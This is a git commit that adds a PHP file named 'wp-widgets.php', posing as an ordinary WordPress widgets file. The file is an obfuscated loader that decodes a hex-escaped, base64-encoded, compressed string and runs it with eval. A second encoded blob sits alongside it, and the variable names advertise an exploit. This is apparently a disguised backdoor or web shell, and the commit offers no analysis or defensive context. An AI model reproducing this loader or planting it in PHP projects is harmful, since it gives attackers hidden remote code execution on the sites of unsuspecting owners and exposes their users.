da357b1f447ce13e72512116508003192ed771c3
XetSec <100395984+XetSec@users.noreply.github.com>
2022-10-18 19:05:32 +0300

    Create wp-widgets.php

---
+++ wp-widgets.php
@@ -0,0 +1,6 @@
+<?php
+$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
+$An0n_3xPloiTeR = "HOJNvtQj9W\x42yFu\x62KU5n5q\x61g/6\x62QF2uw8pzU4qVeq6DvlEuZ13l\x61w/dnilh\x63S1uF\x6165\x61\x43zLTirU\x63Vfu9/vilYZVUoZQ\x63Ow\x63u\x62Pt7M7di\x61SOnHMhXWsiMHUl2\x42wfF\x42PF\x63KPNzsjV5elF\x41yWXwyRzTFmxZSliMO\x41sttFEjf64kVg2O9V\x6218E5D5xwW0JHX6KEUvdgYN\x42d\x61t5Q/V5dOf0J0zNQTGKerNuDgfGgwXKJS4UG3ykU\x63GnY\x42/z5J\x41RkOU\x62UXpjJ/YlE0OoV5yNZ\x61trShZHTU2f\x41Nf\x41QdH\x41fzPzV6w\x2b\x2bgk5u0WgtTnYPkzPJ35ngr\x63\x635Ik\x62\x62if/qmVzyUjFSSlEoIsj\x61GZepuLi\x61\x6177N\x43\x61\x61JEIHy/F9R\x42MDqW0Q1l/zH\x41D\x42wJe\x2bje\x41XEg/jH\x41H\x42wJe\x2bjd\x41nEg/TH\x41L\x42wJe\x2bj\x63\x413Eg/DH\x41P\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($UeXploiT))));
+exit;
+?>
